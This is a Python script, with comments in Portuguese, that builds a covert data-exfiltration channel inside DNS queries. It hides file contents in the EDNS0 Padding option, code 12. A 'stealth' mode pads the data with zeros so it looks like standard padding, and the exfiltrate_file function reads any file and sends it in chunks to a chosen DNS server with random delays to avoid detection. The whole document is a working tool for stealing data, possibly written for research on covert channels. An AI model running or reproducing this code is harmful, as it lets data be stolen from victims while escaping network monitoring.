#!/usr/bin/env python3
"""
T2: Padding Channel
RFC 7830 - Opção de Padding (code 12)
RFC recomenda zeros, mas NÃO obriga.
"""

import struct
import time
import random

from scapy.all import IP, UDP, send, RandShort
from scapy.layers.dns import DNS, DNSQR, DNSRROPT, EDNS0TLV

PADDING_OPT_CODE = 12  # RFC 7830


def encode_data(data: bytes) -> EDNS0TLV:
    """Codificar dados como EDNS0 padding.
    Para um parser que só verifica o código, parece padding legítimo."""
    return EDNS0TLV(
        optcode=PADDING_OPT_CODE,
        optlen=len(data),
        optdata=data
    )


def decode_data(tlv: EDNS0TLV) -> bytes:
    """Decodificar dados do padding"""
    if tlv.optcode == PADDING_OPT_CODE:
        if any(b != 0 for b in tlv.optdata):
            return tlv.optdata
    return b''


def encode_stealth(data: bytes, total_size: int = 468) -> EDNS0TLV:
    """Versão stealth: dados + zeros para completar tamanho padrão.
    RFC 8467 recomenda padding para múltiplos de 468 bytes."""
    if len(data) > total_size:
        raise ValueError(f"Data ({len(data)}B) exceeds total_size ({total_size}B)")
    padded = data + b'\x00' * (total_size - len(data))
    return EDNS0TLV(
        optcode=PADDING_OPT_CODE,
        optlen=total_size,
        optdata=padded
    )


def build_query(domain: str, payload: bytes,
                dns_server: str, stealth: bool = False,
                buf_size: int = 4096):
    """Construir query DNS com dados em padding"""
    if stealth:
        edns0_opt = encode_stealth(payload)
    else:
        edns0_opt = encode_data(payload)

    pkt = (
        IP(dst=dns_server) /
        UDP(dport=53, sport=RandShort()) /
        DNS(
            rd=1,
            qd=DNSQR(qname=domain, qtype='A'),
            ar=DNSRROPT(
                rclass=buf_size,
                rdata=[edns0_opt]
            )
        )
    )
    return pkt


def exfiltrate_file(filepath: str, domain: str,
                    dns_server: str, chunk_size: int = 450,
                    stealth: bool = False):
    """Exfiltrar arquivo inteiro via T2"""
    with open(filepath, 'rb') as f:
        data = f.read()

    total_chunks = (len(data) + chunk_size - 1) // chunk_size

    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]

        header = struct.pack('!HH', i // chunk_size, total_chunks)
        payload = header + chunk

        subdomain = f"p{i // chunk_size}.{domain}"
        pkt = build_query(subdomain, payload, dns_server, stealth=stealth)
        send(pkt, verbose=0)

        time.sleep(random.uniform(0.1, 0.5))

    print(f"[T2] Exfiltrado: {filepath} ({len(data)} bytes, "
          f"{total_chunks} chunks, stealth={stealth})")
